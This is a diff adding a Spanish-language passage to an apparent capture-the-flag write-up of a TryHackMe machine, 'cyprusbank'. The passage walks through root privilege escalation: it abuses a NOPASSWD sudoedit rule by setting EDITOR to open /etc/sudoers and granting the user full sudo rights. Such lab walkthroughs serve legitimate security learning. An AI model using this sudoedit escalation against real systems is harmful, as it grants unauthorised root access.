@@ -172,6 +172,41 @@ THM{XXXXXXXXXXXXX}
 web@cyprusbank:~$ 
 ```
 
+Para ver que comandos puede ejecutar nuestro usuario, haremos sudo -l y vemos que tenemos permisos para ejecutar sudoedit:
+
+```shell
+web@cyprusbank:~/app$ sudo -l     
+sudo -l
+Matching Defaults entries for web on cyprusbank:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
+    XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    mail_badpass
+
+User web may run the following commands on cyprusbank:
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+A partir de aquí tenemos que ver como explotar la máquina y aprovecharnos de esto.
+
+Vemos que hay un exploit que podemos hacer que nos permitiría tener privilegios como root:
+
+```shell
+export EDITOR="vim -- /etc/sudoers"
+```
+
+Esto nos permitirá abrir vim con el fichero /etc/sudoers cuando abramos el archivo /etc/nginx/sites-available/admin.cyprusbank.thm.
+
+Ahora solo nos faltará hacer esto:
+
+```shell
+web ALL=(ALL:ALL) ALL
+```
+
+Y ya podríamos hacer sudo su sin contraseña necesaria :).
+
+Solo nos faltaría encontrar el archivo root.txt, ver su contenido y ya tenemos nuestra sala terminada.
+
 
 
 ---
